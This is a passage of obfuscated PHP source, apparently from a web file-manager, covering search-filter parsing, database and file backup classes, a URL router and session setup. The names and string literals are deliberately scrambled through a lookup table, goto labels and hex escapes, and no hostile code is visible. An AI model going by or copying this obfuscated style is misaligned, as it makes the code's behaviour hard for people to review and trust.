$ƒÕóÉ¨Õ) { $––›ãŞÊ[$”èÆØÃü[525] . $Ûøù±®—] = $ƒÕóÉ¨Õ; } foreach ($ŒşıñŠ as $¹Â´Á¡) { $––›ãŞÊ[] = array($”èÆØÃü[530] => $¹Â´Á¡, $”èÆØÃü[1167] => $”èÆØÃü[2280], array($”èÆØÃü[2452] => $¹Â´Á¡, $”èÆØÃü[2453] => array($”èÆØÃü[7], array($”èÆØÃü[552], $”èÆØÃü[551])))); } $this->join($Ïµ¹ÖÁ¥); $Ï“µÙ™“ = $––›ãŞÊ; } private function _parseSearchWhere($§ÙÁ¼Óß) { $¢¢¬€è» =& $_SERVER[œ—üé‹ê]; $•¼ÃÁõÖ = array(); if (isset($§ÙÁ¼Óß[$¢¢¬€è»[870]]) && $§ÙÁ¼Óß[$¢¢¬€è»[870]]) { $•¼ÃÁõÖ[$¢¢¬€è»[88]] = array($¢¢¬€è»[2454], $§ÙÁ¼Óß[$¢¢¬€è»[870]]); } if (isset($§ÙÁ¼Óß[$¢¢¬€è»[871]]) && $§ÙÁ¼Óß[$¢¢¬€è»[871]]) { $×Ì°‡ïÁ = array($¢¢¬€è»[2455], $§ÙÁ¼Óß[$¢¢¬€è»[871]]); if ($•¼ÃÁõÖ[$¢¢¬€è»[88]]) { $•¼ÃÁõÖ[$¢¢¬€è»[88]] = array($•¼ÃÁõÖ[$¢¢¬€è»[88]], $×Ì°‡ïÁ, $¢¢¬€è»[2456]); } else { $•¼ÃÁõÖ[$¢¢¬€è»[88]] = $×Ì°‡ïÁ; } } if (isset($§ÙÁ¼Óß[$¢¢¬€è»[2448]]) && $§ÙÁ¼Óß[$¢¢¬€è»[2448]] > 0) { $•¼ÃÁõÖ[$¢¢¬€è»[79]] = array($¢¢¬€è»[2454], $§ÙÁ¼Óß[$¢¢¬€è»[2448]]); } if (isset($§ÙÁ¼Óß[$¢¢¬€è»[2449]]) && $§ÙÁ¼Óß[$¢¢¬€è»[2449]]) { $×Ì°‡ïÁ = array($¢¢¬€è»[2455], $§ÙÁ¼Óß[$¢¢¬€è»[2449]]); if ($•¼ÃÁõÖ[$¢¢¬€è»[79]]) { $•¼ÃÁõÖ[$¢¢¬€è»[79]] = array($•¼ÃÁõÖ[$¢¢¬€è»[79]], $×Ì°‡ïÁ, $¢¢¬€è»[2456]); } else { $•¼ÃÁõÖ[$¢¢¬€è»[79]] = $×Ì°‡ïÁ; } } if (isset($§ÙÁ¼Óß[$¢¢¬€è»[684]]) && $§ÙÁ¼Óß[$¢¢¬€è»[684]]) { $•¼ÃÁõÖ[] = array($¢¢¬€è»[543] => $§ÙÁ¼Óß[$¢¢¬€è»[684]], $¢¢¬€è»[541] => $§ÙÁ¼Óß[$¢¢¬€è»[684]], $¢¢¬€è»[1167] => $¢¢¬€è»[2280]); } if (isset($§ÙÁ¼Óß[$¢¢¬€è»[501]]) && $§ÙÁ¼Óß[$¢¢¬€è»[501]]) { $äƒãÃˆ× = $§ÙÁ¼Óß[$¢¢¬€è»[501]]; if ($äƒãÃˆ× == $¢¢¬€è»[78]) { $•¼ÃÁõÖ[$¢¢¬€è»[500]] = 1; } else { if ($äƒãÃˆ× == $¢¢¬€è»[2457]) { $•¼ÃÁõÖ[$¢¢¬€è»[500]] = 0; } else { if ($äƒãÃˆ×) { $äƒãÃˆ× = is_array($äƒãÃˆ×) ? $äƒãÃˆ× : explode($¢¢¬€è»[50], $äƒãÃˆ×); $•¼ÃÁõÖ[$¢¢¬€è»[501]] = array($¢¢¬€è»[507], $äƒãÃˆ×); $•¼ÃÁõÖ[$¢¢¬€è»[500]] = 0; } } } } $this->_parseSearchParent($§ÙÁ¼Óß, $•¼ÃÁõÖ); if (isset($§ÙÁ¼Óß[$¢¢¬€è»[2276]]) && trim($§ÙÁ¼Óß[$¢¢¬€è»[2276]])) { $Ö÷Èñğ¼ = trim($§ÙÁ¼Óß[$¢¢¬€è»[2276]]); $ö“³¦“İ = explode($¢¢¬€è»[53], $Ö÷Èñğ¼); if (strlen($Ö÷Èñğ¼) > 2 && (substr($Ö÷Èñğ¼, 0, 1) == $¢¢¬€è»[118] && substr($Ö÷Èñğ¼, -1) == $¢¢¬€è»[118]) || substr($Ö÷Èñğ¼, 0, 1) == $¢¢¬€è»[58] && substr($Ö÷Èñğ¼, -1) == $¢¢¬€è»[58]) { $Ö÷Èñğ¼ = substr($Ö÷Èñğ¼, 1, -1); $ö“³¦“İ = array($Ö÷Èñğ¼); } $•¼ÃÁõÖ[$¢¢¬€è»[32]] = array(array($¢¢¬€è»[635], $¢¢¬€è»[2278] . $Ö÷Èñğ¼ . $¢¢¬€è»[2278])); if (count($ö“³¦“İ) > 1) { $•¼ÃÁõÖ[$¢¢¬€è»[32]] = array(); foreach ($ö“³¦“İ as $ïºàŞúğ) { if (!trim($ïºàŞúğ)) { continue; } $•¼ÃÁõÖ[$¢¢¬€è»[32]][] = array($¢¢¬€è»[635], $¢¢¬€è»[2278] . trim($ïºàŞúğ) . $¢¢¬€è»[2278]); } } } return $•¼ÃÁõÖ; } private function _parseSearchParent($ô¡™ÈÙÏ, &$âÕ€Ûù®) { $¦şÊ“Í‡ =& $_SERVER[œ—üé‹ê]; if (!isset($ô¡™ÈÙÏ[$¦şÊ“Í‡[190]]) || !$ô¡™ÈÙÏ[$¦şÊ“Í‡[190]]) { return; } $ßõ±»¼ = $this->pathInfo($ô¡™ÈÙÏ[$¦şÊ“Í‡[190]]); $•¯ôşé = $ßõ±»¼[$¦şÊ“Í‡[190]] . $¦şÊ“Í‡[12] === $¦şÊ“Í‡[228]; $ïÈÆ¥Çü = $ßõ±»¼[$¦şÊ“Í‡[188]] == $¦şÊ“Í‡[598]; if ($ßõ±»¼[$¦şÊ“Í‡[614]] == $¦şÊ“Í‡[615]) { $ôîµƒà¢ = $this->sourceInfo($ô¡™ÈÙÏ[$¦şÊ“Í‡[190]]); $ßõ±»¼[$¦şÊ“Í‡[604]] = $ôîµƒà¢[$¦şÊ“Í‡[604]]; } $âÕ€Ûù®[$¦şÊ“Í‡[674]] = array($¦şÊ“Í‡[635], $ßõ±»¼[$¦şÊ“Í‡[604]] . $ô¡™ÈÙÏ[$¦şÊ“Í‡[190]] . $¦şÊ“Í‡[636]); $§±Æ¥’ = isset($ô¡™ÈÙÏ[$¦şÊ“Í‡[2140]]) && in_array($¦şÊ“Í‡[598], $ô¡™ÈÙÏ[$¦şÊ“Í‡[2140]]); if (!$§±Æ¥’ || !$ïÈÆ¥Çü || !$•¯ôşé || !$ßõ±»¼[$¦şÊ“Í‡[502]]) { return; } if (!AuthModel::authCheckRoot($ßõ±»¼[$¦şÊ“Í‡[502]][$¦şÊ“Í‡[503]])) { return; } $…Ç‡¿·æ = $ßõ±»¼[$¦şÊ“Í‡[589]] . $¦şÊ“Í‡[12]; if ($…Ç‡¿·æ == $¦şÊ“Í‡[91]) { unset($âÕ€Ûù®[$¦şÊ“Í‡[674]]); $âÕ€Ûù®[$¦şÊ“Í‡[188]] = self::TYPE_GROUP; return; } $İÅëíÅò = Model($¦şÊ“Í‡[605])->groupChildrenAll($…Ç‡¿·æ); $ÙØ·‚¥ˆ = count($İÅëíÅò); if ($ÙØ·‚¥ˆ <= 1) { return; } $¯¾ßÍ” = array($¦şÊ“Í‡[190] => 0, $¦şÊ“Í‡[188] => self::TYPE_GROUP, $¦şÊ“Í‡[589] => array($¦şÊ“Í‡[7], $İÅëíÅò)); $îŸ©Òà = $this->field($¦şÊ“Í‡[2458])->where($¯¾ßÍ”)->limit($ÙØ·‚¥ˆ)->select(); $âÕ€Ûù®[$¦şÊ“Í‡[674]] = array(); foreach ($îŸ©Òà as $Š¢º…ˆ®) { $âÕ€Ûù®[$¦şÊ“Í‡[674]][] = array($¦şÊ“Í‡[635], $¦şÊ“Í‡[613] . $Š¢º…ˆ®[$¦şÊ“Í‡[191]] . $¦şÊ“Í‡[636]); } $âÕ€Ûù®[$¦şÊ“Í‡[674]][] = $¦şÊ“Í‡[2280]; } } goto FºÜÙ¤Ç†É; D½´»…¬¦‘: class Backup { protected static $name; protected static $option; protected static $manual; protected $model; public $message; public function __construct() { $this->model = Model($_SERVER[œ—üé‹ê][857]); $›Ñ¾¨ÅÎ = $this->init(); if (!$›Ñ¾¨ÅÎ) { return; } $this->keep(); } public function init() { $”ìÕ€£ü =& $_SERVER[œ—üé‹ê]; $this->isManual(); self::$name = date($”ìÕ€£ü[858]); if (!($‘•ø³İƒ = $this->model->lastItem())) { $‘•ø³İƒ = $this->initData(); } else { self::$name = $‘•ø³İƒ[$”ìÕ€£ü[32]]; if ($‘•ø³İƒ[$”ìÕ€£ü[859]] == $”ìÕ€£ü[91]) { self::$name = date($”ìÕ€£ü[259]); $à¾›åÔì = intval(_get($‘•ø³İƒ, $”ìÕ€£ü[860], 0)); if (self::$manual == 0 && $‘•ø³İƒ[$”ìÕ€£ü[32]] == self::$name) { $this->model->remove($‘•ø³İƒ[$”ìÕ€£ü[487]]); } $‘•ø³İƒ = $this->initData($à¾›åÔì, $‘•ø³İƒ[$”ìÕ€£ü[861]]); } else { $Â½§ØÔ = $this->checkStore($‘•ø³İƒ[$”ìÕ€£ü[861]]); if (!$Â½§ØÔ) { return !1; } } } if (!$‘•ø³İƒ) { return !1; } self::$option = $‘•ø³İƒ; } private function isManual() { $áŒ®Æšº = _get($GLOBALS, $_SERVER[œ—üé‹ê][862], 0); $áŒ®Æšº = intval($áŒ®Æšº); self::$manual = $áŒ®Æšº && $áŒ®Æšº == 1 ? 1 : 0; } private function initData($ºÛœªÎ’ = 0, $­ÏšÂ¾ = '') { $»Äñ“Ğ =& $_SERVER[œ—üé‹ê]; $îÒ”úû = $this->model->config(); if ($­ÏšÂ¾ && $îÒ”úû[$»Äñ“Ğ[861]] != $­ÏšÂ¾) { $ºÛœªÎ’ = 0; } $Ÿ‡£ÙÎÇ = $this->checkStore($îÒ”úû[$»Äñ“Ğ[861]]); if (!$Ÿ‡£ÙÎÇ) { return !1; } if (self::$manual == 1) { self::$name .= $»Äñ“Ğ[11] . date($»Äñ“Ğ[863]); } $ºşŒò–„ = array($»Äñ“Ğ[861] => $îÒ”úû[$»Äñ“Ğ[861]], $»Äñ“Ğ[32] => self::$name, $»Äñ“Ğ[859] => 0, $»Äñ“Ğ[168] => $îÒ”úû[$»Äñ“Ğ[168]], $»Äñ“Ğ[864] => self::$manual, $»Äñ“Ğ[865] => array($»Äñ“Ğ[866] => array($»Äñ“Ğ[859] => 0), $»Äñ“Ğ[867] => array($»Äñ“Ğ[859] => 0, $»Äñ“Ğ[868] => 0, $»Äñ“Ğ[869] => 0, $»Äñ“Ğ[33] => $»Äñ“Ğ[12], $»Äñ“Ğ[870] => 0, $»Äñ“Ğ[871] => 0), $»Äñ“Ğ[872] => array($»Äñ“Ğ[859] => 0, $»Äñ“Ğ[868] => 0, $»Äñ“Ğ[869] => 0, $»Äñ“Ğ[870] => 0, $»Äñ“Ğ[871] => 0), $»Äñ“Ğ[230] => array($»Äñ“Ğ[859] => 0, $»Äñ“Ğ[873] => 0, $»Äñ“Ğ[874] => 0, $»Äñ“Ğ[875] => 0, $»Äñ“Ğ[876] => 0, $»Äñ“Ğ[557] => $ºÛœªÎ’, $»Äñ“Ğ[870] => 0, $»Äñ“Ğ[871] => 0)), $»Äñ“Ğ[870] => time(), $»Äñ“Ğ[871] => 0); $Ğë”÷Ë = $this->model->insert($ºşŒò–„); $ºşŒò–„[$»Äñ“Ğ[487]] = $Ğë”÷Ë; return $ºşŒò–„; } private function checkStore($¯×‘õ¯‡) { $ÈØşˆ°¡ = Model($_SERVER[œ—üé‹ê][877]); $µ¡ô – = $ÈØşˆ°¡->listData($¯×‘õ¯‡); $”Ä‘½í¼ = $ÈØşˆ°¡->checkConfig($µ¡ô –, !0); if ($”Ä‘½í¼ !== !0) { $this->message = $”Ä‘½í¼; return !1; } return !0; } public static function get() { if (!self::$option) { $û€ƒãäÖ = Model($_SERVER[œ—üé‹ê][857]); $øÚĞóŞ‹ = $û€ƒãäÖ->findByName(self::$name); $û€ƒãäÖ->parseContent($øÚĞóŞ‹); self::$option = $øÚĞóŞ‹; } return self::$option; } public static function set($Èî÷Âƒ¬) { $³ÙÖƒ =& $_SERVER[œ—üé‹ê]; $“ÅÅÛşÙ = self::get(); foreach ($Èî÷Âƒ¬ as $½û¡ÑÂñ => $²î©àã) { array_set_value($“ÅÅÛşÙ, $½û¡ÑÂñ, $²î©àã); } Model($³ÙÖƒ[857])->update($“ÅÅÛşÙ[$³ÙÖƒ[487]], $“ÅÅÛşÙ); self::$option = $“ÅÅÛşÙ; return self::$option; } public function keep() { $Æ˜Ûı‹Á =& $_SERVER[œ—üé‹ê]; $ñ°ì»İØ = self::get(); if (_get($ñ°ì»İØ, $Æ˜Ûı‹Á[878], 0) == $Æ˜Ûı‹Á[91]) { return; } $this->backupKeep($ñ°ì»İØ); self::set(array($Æ˜Ûı‹Á[878] => 1)); } private function backupKeep($›‡×á) { $Ÿ³¦ÊÇ™ =& $_SERVER[œ—üé‹ê]; if (self::$manual == 1) { return; } $Òàâ“êĞ = $this->model->listData(); if (empty($Òàâ“êĞ)) { return; } $„Œ’¢åÆ = array(); $’”º‹êè = array(); $”ÔÎÖÉß = date($Ÿ³¦ÊÇ™[879], strtotime($Ÿ³¦ÊÇ™[880])); foreach ($Òàâ“êĞ as $á±ìîØá => $×Øù—Âè) { $ô°ÕëÈß = $×Øù—Âè[$Ÿ³¦ÊÇ™[32]]; if ($á±ìîØá < 7 || $×Øù—Âè[$Ÿ³¦ÊÇ™[864]] == $Ÿ³¦ÊÇ™[91]) { $„Œ’¢åÆ[] = $ô°ÕëÈß; continue; } $£Šª‡Ÿ¸ = substr($ô°ÕëÈß, 0, 6); if ($£Šª‡Ÿ¸ < $”ÔÎÖÉß) { continue; } if (!isset($’”º‹êè[$£Šª‡Ÿ¸]) || $ô°ÕëÈß < $’”º‹êè[$£Šª‡Ÿ¸]) { $’”º‹êè[$£Šª‡Ÿ¸] = $ô°ÕëÈß; } if (substr($ô°ÕëÈß, 6, 2) == $Ÿ³¦ÊÇ™[881]) { $’”º‹êè[$£Šª‡Ÿ¸] = $ô°ÕëÈß; } } $„Œ’¢åÆ = array_merge($„Œ’¢åÆ, array_values($’”º‹êè)); $„Œ’¢åÆ = array_unique($„Œ’¢åÆ); foreach ($Òàâ“êĞ as $×Øù—Âè) { $ô°ÕëÈß = $×Øù—Âè[$Ÿ³¦ÊÇ™[32]]; if (!empty($ô°ÕëÈß) && in_array($ô°ÕëÈß, $„Œ’¢åÆ)) { continue; } $this->model->remove($×Øù—Âè[$Ÿ³¦ÊÇ™[487]]); $˜ªü½Úù = $this->backupPath($›‡×á); IO::remove($˜ªü½Úù, !1); } } private function backupPath($¨Ë…ÇÊª) { $ŠÉÁİ»¶ =& $_SERVER[œ—üé‹ê]; static $ËÌúĞ’ = null; if (is_null($ËÌúĞ’)) { $ËÌúĞ’ = Model($ŠÉÁİ»¶[882])->get($ŠÉÁİ»¶[883]); } $ïÆÕçé½ = $¨Ë…ÇÊª[$ŠÉÁİ»¶[32]]; $‡ÎÌŸé = substr(md5($ŠÉÁİ»¶[884] . $ËÌúĞ’ . $ïÆÕçé½), 0, 8); return "\x7b\x69\157\72{$¨Ë…ÇÊª[$ŠÉÁİ»¶[861]]}\x7d\57\144\141\164\x61\x62\141\x73\145\x2f\142\141\x63\153\x75\x70\x2f" . $ïÆÕçé½ . $ŠÉÁİ»¶[11] . $‡ÎÌŸé; } public function db() { $³°‹ÊÁ =& $_SERVER[œ—üé‹ê]; $±Ì¹¯÷ = self::get(); if (_get($±Ì¹¯÷, $³°‹ÊÁ[885], 0) == $³°‹ÊÁ[91]) { return !0; } $çº¡Ú = new BackupDb(); if (!$çº¡Ú->index()) { return !1; } self::set(array($³°‹ÊÁ[885] => 1)); return !0; } public function dbFile() { $¯Ó¹¤µŞ =& $_SERVER[œ—üé‹ê]; $¾Û…€ƒŒ = self::get(); if (_get($¾Û…€ƒŒ, $¯Ó¹¤µŞ[886], 0) == $¯Ó¹¤µŞ[91]) { return !0; } $‰†àÄ´¡ = new BackupDbFile(); if (!$‰†àÄ´¡->index()) { return !1; } self::set(array($¯Ó¹¤µŞ[886] => 1)); return !0; } public function file() { $åş”ËÌÂ =& $_SERVER[œ—üé‹ê]; $Ğñ½‘©ç = self::get(); if (_get($Ğñ½‘©ç, $åş”ËÌÂ[887], 0) == $åş”ËÌÂ[91]) { return !0; } self::set(array($åş”ËÌÂ[887] => 1, $åş”ËÌÂ[859] => 1)); return !0; } public static function log($ï“–äÃ) { write_log($ï“–äÃ, $_SERVER[œ—üé‹ê][888]); } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $Œ‰ˆÉŒç =& $_SERVER[œ—üé‹ê]; $ıÎã„ñÄ = Backup::get(); self::$io = $ıÎã„ñÄ[$Œ‰ˆÉŒç[861]]; self::$name = $ıÎã„ñÄ[$Œ‰ˆÉŒç[32]]; $‚Ç¯Àï· = new DbManage(); $Œ«ËÙÁ² = $‚Ç¯Àï·->dbType(); $Ìú¶§–À = array($Œ‰ˆÉŒç[889] => $Œ«ËÙÁ², $Œ‰ˆÉŒç[890] => time()); Backup::set($Ìú¶§–À); $Ÿ¤Ú…Íø = $this->tmpFilesPath() . $Œ‰ˆÉŒç[891] . self::$name . $Œ‰ˆÉŒç[8]; del_dir($Ÿ¤Ú…Íø); mk_dir($Ÿ¤Ú…Íø); $êñĞç½ = $ŞåÕëãÅ = 0; try { $ÖŞÔÒ§‘ = $‚Ç¯Àï·->db()->getTables(); } catch (Exception $íË»Ë‡›) { Backup::log($Œ‰ˆÉŒç[892] . $íË»Ë‡›->getMessage()); return !1; } $ÖŞÔÒ§‘ = array_diff($ÖŞÔÒ§‘, array($Œ‰ˆÉŒç[893], $Œ‰ˆÉŒç[894])); foreach ($ÖŞÔÒ§‘ as $ÍÅèŞÉè) { if ($ÍÅèŞÉè == $Œ‰ˆÉŒç[472]) { continue; } $êñĞç½ += $‚Ç¯Àï·->model($ÍÅèŞÉè)->count(); } $ã÷¡Ÿ“ = new Task($Œ‰ˆÉŒç[895], $Œ‰ˆÉŒç[888], $êñĞç½, LNG($Œ‰ˆÉŒç[896]) . $Œ‰ˆÉŒç[897] . LNG($Œ‰ˆÉŒç[898])); $GLOBALS[$Œ‰ˆÉŒç[899]] = self::$name; foreach ($ÖŞÔÒ§‘ as $ÍÅèŞÉè) { $ãõìÅÕ– = $Ÿ¤Ú…Íø . $ÍÅèŞÉè . $Œ‰ˆÉŒç[900]; if ($ÍÅèŞÉè == $Œ‰ˆÉŒç[472]) { @touch($ãõìÅÕ–); continue; } $ŞåÕëãÅ += $‚Ç¯Àï·->sqlFromDb($ÍÅèŞÉè, $ãõìÅÕ–, $ã÷¡Ÿ“); } unset($GLOBALS[$Œ‰ˆÉŒç[899]]); $ã÷¡Ÿ“->end(); if ($ŞåÕëãÅ > $êñĞç½) { $êñĞç½ = $ŞåÕëãÅ; } $Ìú¶§–À = array($Œ‰ˆÉŒç[889] => $Œ«ËÙÁ², $Œ‰ˆÉŒç[885] => 1, $Œ‰ˆÉŒç[901] => $êñĞç½, $Œ‰ˆÉŒç[902] => $ŞåÕëãÅ, $Œ‰ˆÉŒç[903] => time()); Backup::set($Ìú¶§–À); if ($êñĞç½ - $ŞåÕëãÅ > 0) { $û´™åº§ = $Œ‰ˆÉŒç[904]; if (!stristr(I18n::getType(), $Œ‰ˆÉŒç[905])) { $û´™åº§ = $Œ‰ˆÉŒç[906]; } Backup::log(array($û´™åº§, $Ìú¶§–À)); return !1; } return !0; } private function tmpFilesPath() { $è¨¸´Ê‰ =& $_SERVER[œ—üé‹ê]; $øñÓ€Üš = TEMP_FILES; if ($GLOBALS[$è¨¸´Ê‰[6]][$è¨¸´Ê‰[92]][$è¨¸´Ê‰[907]]) { $øñÓ€Üš = $GLOBALS[$è¨¸´Ê‰[6]][$è¨¸´Ê‰[92]][$è¨¸´Ê‰[907]]; if (!mk_dir($øñÓ€Üš) || !is_writable($øñÓ€Üš) || !IO::mkfile($øñÓ€Üš . $è¨¸´Ê‰[908])) { $øñÓ€Üš = TEMP_FILES; } } return $øñÓ€Üš; } } class BackupDbFile { public function __construct() { } public function index() { $ˆƒåË¾¾ =& $_SERVER[œ—üé‹ê]; $Î”¬Û£ = Backup::get(); $Ò“›‹‡™ = $Î”¬Û£[$ˆƒåË¾¾[32]]; $¨ã‰¶øÄ = $this->tmpFilesPath() . "\x62\141\x63\x6b\165\x70\x5f{$Ò“›‹‡™}\57"; $ëÏüß©Ñ = $this->backupPath($Î”¬Û£); if (!($ëÏüß©Ñ = IO::mkdir($ëÏüß©Ñ))) { Backup::log($ˆƒåË¾¾[909] . $ëÏüß©Ñ); return !1; } $Ä‹ê‰œË = new DbManage(); $ŠêµÄÜ€ = $Ä‹ê‰œË->getSqlFile(); if (!$ŠêµÄÜ€ || !$ŠêµÄÜ€[$ˆƒåË¾¾[910]] || !$ŠêµÄÜ€[$ˆƒåË¾¾[13]]) { Backup::log($ˆƒåË¾¾[911]); return !1; } IO::move($ŠêµÄÜ€[$ˆƒåË¾¾[910]], $¨ã‰¶øÄ); IO::move($ŠêµÄÜ€[$ˆƒåË¾¾[13]], $¨ã‰¶øÄ); $Ä‹ê‰œË->mixBakList($¨ã‰¶øÄ); $ŠœØøÔ® = IO::listPath($¨ã‰¶øÄ); $¦áÉäÙ¾ = isset($ŠœØøÔ®[$ˆƒåË¾¾[86]]) ? $ŠœØøÔ®[$ˆƒåË¾¾[86]] : array(); $®Ğ®×ŞÀ = array_sum(array_column($¦áÉäÙ¾, $ˆƒåË¾¾[79])); if (!$®Ğ®×ŞÀ) { Backup::log($ˆƒåË¾¾[912] . $¨ã‰¶øÄ); return !1; } $â§˜Ìµ = array($ˆƒåË¾¾[913] => $®Ğ®×ŞÀ, $ˆƒåË¾¾[914] => time()); Backup::set($â§˜Ìµ); Hook::trigger($ˆƒåË¾¾[915], $¨ã‰¶øÄ, $ëÏüß©Ñ); $‰¨ˆğ‡ä = new TaskFileTransfer($ˆƒåË¾¾[915], $ˆƒåË¾¾[888], count($¦áÉäÙ¾), LNG($ˆƒåË¾¾[896]) . $ˆƒåË¾¾[476] . LNG($ˆƒåË¾¾[898]) . $ˆƒåË¾¾[916]); $‰¨ˆğ‡ä->task[$ˆƒåË¾¾[873]] = $®Ğ®×ŞÀ; foreach ($ŠœØøÔ®[$ˆƒåË¾¾[86]] as $û£ô¤ùÜ) { $Ğ” ÔÙß = IO::move($û£ô¤ùÜ[$ˆƒåË¾¾[87]], $ëÏüß©Ñ); if (!$Ğ” ÔÙß) { $‰¨ˆğ‡ä->end(); $Áôã¡õ = IO::getLastError($ˆƒåË¾¾[917] . $û£ô¤ùÜ[$ˆƒåË¾¾[87]] . $ˆƒåË¾¾[918] . $ëÏüß©Ñ . $ˆƒåË¾¾[175]); Backup::log($Áôã¡õ); return !1; } } $‰¨ˆğ‡ä->end(); $â§˜Ìµ = array($ˆƒåË¾¾[919] => $®Ğ®×ŞÀ, $ˆƒåË¾¾[920] => time()); Backup::set($â§˜Ìµ); return !0; } private function backupPath($¯ñŸç™«) { $›Üèş°© =& $_SERVER[œ—üé‹ê]; $ş¾óÜ = $¯ñŸç™«[$›Üèş°©[32]]; $Ò‹±àø» = Model($›Üèş°©[882])->get($›Üèş°©[883]); $æ‚¯¹š“ = substr(md5($›Üèş°©[884] . $Ò‹±àø» . $ş¾óÜ), 0, 8); return "\173\x69\157\x3a{$¯ñŸç™«[$›Üèş°©[861]]}\175\57\x64\x61\x74\141\142\x61\x73\x65\57\142\141\143\153\165\x70\57" . $ş¾óÜ . $›Üèş°©[11] . $æ‚¯¹š“; } private function tmpFilesPath() { $íº¦îà´ =& $_SERVER[œ—üé‹ê]; $¢Å³†ü» = TEMP_FILES; if ($GLOBALS[$íº¦îà´[6]][$íº¦îà´[92]][$íº¦îà´[907]]) { $¢Å³†ü» = $GLOBALS[$íº¦îà´[6]][$íº¦îà´[92]][$íº¦îà´[907]]; if (!mk_dir($¢Å³†ü») || !is_writable($¢Å³†ü») || !IO::mkfile($¢Å³†ü» . $íº¦îà´[908])) { $¢Å³†ü» = TEMP_FILES; } } return $¢Å³†ü»; } } goto dá—™…ÎË; AÉÚÓ“Ş‹Ò: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\x6e\171" => "\x5b\x5e\57\135\x2b", "\72\x6e\x75\155" => "\133\60\55\71\135\53", "\72\x61\x6c\154" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($éÖòË, $‰±¶€¥³) { $Ò·íş†° =& $_SERVER[œ—üé‹ê]; if ($éÖòË == $Ò·íş†°[1911]) { $ßµ÷Şî = array_map($Ò·íş†°[1912], $‰±¶€¥³[0]); $Ú‹›™£“ = strpos($‰±¶€¥³[1], $Ò·íş†°[8]) === 0 ? $‰±¶€¥³[1] : $Ò·íş†°[8] . $‰±¶€¥³[1]; $Àû¦÷ë = $‰±¶€¥³[2]; } else { $ßµ÷Şî = null; $Ú‹›™£“ = strpos($‰±¶€¥³[0], $Ò·íş†°[8]) === 0 ? $‰±¶€¥³[0] : $Ò·íş†°[8] . $‰±¶€¥³[0]; $Àû¦÷ë = $‰±¶€¥³[1]; } array_push(self::$maps, $ßµ÷Şî); array_push(self::$routes, $Ú‹›™£“); array_push(self::$methods, strtoupper($éÖòË)); array_push(self::$callbacks, $Àû¦÷ë); } public static function error($Ğºı¦») { self::$errorCallback = $Ğºı¦»; } public static function haltOnMatch($Ñ¨“°‡´ = true) { self::$halts = $Ñ¨“°‡´; } public static function dispatch() { $Ê¨ªìØ£ =& $_SERVER[œ—üé‹ê]; $õ€È”Ì = parse_url($_SERVER[$Ê¨ªìØ£[1913]], PHP_URL_PATH); $İş—Íü = $_SERVER[$Ê¨ªìØ£[161]]; $İŞ®øõˆ = array_keys(static::$patterns); $›Âòèí = array_values(static::$patterns); $åÑ°²‹’ = !1; self::$routes = preg_replace($Ê¨ªìØ£[1462], $Ê¨ªìØ£[8], self::$routes); if (in_array($õ€È”Ì, self::$routes)) { $îƒ˜É˜ä = array_keys(self::$routes, $õ€È”Ì); foreach ($îƒ˜É˜ä as $™Ã×…È) { if (self::$methods[$™Ã×…È] == $İş—Íü || self::$methods[$™Ã×…È] == $Ê¨ªìØ£[1914] || in_array($İş—Íü, self::$maps[$™Ã×…È])) { $åÑ°²‹’ = !0; if (!is_object(self::$callbacks[$™Ã×…È])) { $Î¥ü‘ = explode($Ê¨ªìØ£[8], self::$callbacks[$™Ã×…È]); $…Á›˜ÃŒ = end($Î¥ü‘); $¸€û«Ö = explode($Ê¨ªìØ£[1394], $…Á›˜ÃŒ); $æ³†Ô… = new $¸€û«Ö[0](); $æ³†Ô…->{$¸€û«Ö[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$™Ã×…È]); if (self::$halts) { return; } } } } } else { $Óõéğñµ = 0; foreach (self::$routes as $™Ã×…È) { if (strpos($™Ã×…È, $Ê¨ªìØ£[4]) !== !1) { $™Ã×…È = str_replace($İŞ®øõˆ, $›Âòèí, $™Ã×…È); } if (preg_match($Ê¨ªìØ£[1915] . $™Ã×…È . $Ê¨ªìØ£[1916], $õ€È”Ì, $Ü‡ùÇÄä)) { if (self::$methods[$Óõéğñµ] == $İş—Íü || self::$methods[$Óõéğñµ] == $Ê¨ªìØ£[1914] || !empty(self::$maps[$Óõéğñµ]) && in_array($İş—Íü, self::$maps[$Óõéğñµ])) { $åÑ°²‹’ = !0; array_shift($Ü‡ùÇÄä); if (!is_object(self::$callbacks[$Óõéğñµ])) { $Î¥ü‘ = explode($Ê¨ªìØ£[8], self::$callbacks[$Óõéğñµ]); $…Á›˜ÃŒ = end($Î¥ü‘); $¸€û«Ö = explode($Ê¨ªìØ£[1394], $…Á›˜ÃŒ); $æ³†Ô… = new $¸€û«Ö[0](); if (!method_exists($æ³†Ô…, $¸€û«Ö[1])) { echo $Ê¨ªìØ£[1917]; } else { call_user_func_array(array($æ³†Ô…, $¸€û«Ö[1]), $Ü‡ùÇÄä); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$Óõéğñµ], $Ü‡ùÇÄä); if (self::$halts) { return; } } } } $Óõéğñµ++; } } if ($åÑ°²‹’ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $–‰Š²ÅÆ =& $_SERVER[œ—üé‹ê]; header($_SERVER[$–‰Š²ÅÆ[1918]] . $–‰Š²ÅÆ[1919]); echo $–‰Š²ÅÆ[1920]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$Ê¨ªìØ£[1913]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $ô½óø¨§ =& $_SERVER[œ—üé‹ê]; static $¹Äñàï– = false; if ($¹Äñàï–) { return $¹Äñàï–; } $ğİÃ¯äÍ = $GLOBALS[$ô½óø¨§[6]][$ô½óø¨§[424]]; self::$sessionTime = $ğİÃ¯äÍ[$ô½óø¨§[1921]]; $Ö‡‘¥Ú– = isset($GLOBALS[$ô½óø¨§[1922]]) ? $GLOBALS[$ô½óø¨§[1922]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($Ö‡‘¥Ú–)) { self::$sessionSign = Cookie::get($Ö‡‘¥Ú–); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($Ö‡‘¥Ú–, self::$sessionSign, self::$sessionTime); $ÁŞˆåÈŞ = 